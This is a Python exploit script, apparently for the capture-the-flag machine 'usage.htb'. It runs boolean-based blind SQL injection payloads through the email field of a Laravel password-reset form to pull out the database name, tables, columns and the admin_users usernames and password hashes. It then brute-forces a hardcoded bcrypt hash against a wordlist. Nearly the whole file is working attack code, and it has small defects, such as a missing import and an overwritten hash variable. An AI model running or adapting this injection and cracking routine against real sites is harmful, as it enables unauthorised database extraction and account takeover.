#!/usr/bin/python3

from pwn import *
import bcrypt
import requests, signal, os, subprocess, string

# Variables
url = 'http://usage.htb/forget-password'
alphabet = string.ascii_lowercase + '_'
alphabet_punctuation = string.ascii_letters + string.punctuation + string.digits

# Ctr + C 
def df_handler(sig, frame):
    log.info('\n[!] Exiting... \n')
    sys.exit(1)

signal.signal(signal.SIGINT, df_handler)


# Start SQLInjection
def injection(extract):
    extraction = ''
    i = 0

    while True:
        i += 1
        for char in alphabet_punctuation:
            if extract == 'db':
                prog_database.status(extraction)
                post_data = {
                    '_token': token,
                    'email': f"test' or substring(database(),{i},1)='{char}'-- -"
                }
            elif extract == 'table':
                prog_tables.status(extraction.split(',')[-1]) 
                post_data = {
                    '_token': token,
                    'email': f"test' or substring((select group_concat(table_name) from information_schema.tables where table_schema='{db}'),{i},1)='{char}'-- -"
                }
            elif extract == 'column':
                prog_columns.status(extraction.split(',')[-1])
                post_data = {
                    '_token': token,
                    'email': f"test' or substring((select group_concat(column_name) from information_schema.columns where table_schema='{db}' and table_name='admin_users'),{i},1)='{char}'-- -"
                }
            elif extract == 'creds':
                prog_creds.status(extraction)
                post_data = {
                    '_token': token,
                    'email': f"test' or substring((select group_concat((BINARY username), ':',(BINARY password)) from admin_users),{i},1)='{char}'-- -"
                }

            r = requests.post(url, data=post_data, cookies=cookies)
            if "We have e-mailed your password reset link to" in r.text:
                extraction += char
                break
            elif "Page Expired" in r.text:
                log.info('[!] Web session is expired or cookies and token are not valid, please update session cookies and token')
                sys.exit(1)

        if len(extraction) != i:
            return extraction

def crackHash(h): 
    with open('test.txt', 'r') as wordlist:
        for line in wordlist:
            prog_password.status(line)
            hashPass = bcrypt.hashpw(line.strip().encode('utf-8'), h.encode('utf-8'))
            if hashPass == h.encode('utf-8'):
                return line
            

if __name__ == '__main__':
    # Get cookies and token for sessions
    log.info("Getting session cookies and token \n [!] Be careful of url encoded cookies")
    xsrf_token = input("What is the XSRF-TOKEN cookies? \n")
    laravel_session = input("What is the laravel_session cookie? \n")
    token = input("What is the session token?\n")

    cookies = {
        'XSRF-TOKEN': xsrf_token,
        'laravel_session': laravel_session 
    }

    log.info("Performing SQL Injection")

    prog_database = log.progress('Extracting Database Name')     
    db = injection('db')
    prog_database.success(db)
    
    prog_tables = log.progress('Extracting Table Names') 
    tables = injection('table')
    prog_tables.success(tables)

    prog_columns = log.progress('Extracting Column Names') 
    columns = injection('column')
    prog_columns.success(columns)

    prog_creds = log.progress('Extracting Usernames & Passwords')
    creds = injection('creds')
    prog_creds.success(creds)

    h = creds.split(':')[1]
    h = '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2'
    print(h)
    prog_password = log.progress('Craking Hash')
    password = crackHash(h)
    prog_password.success(password)
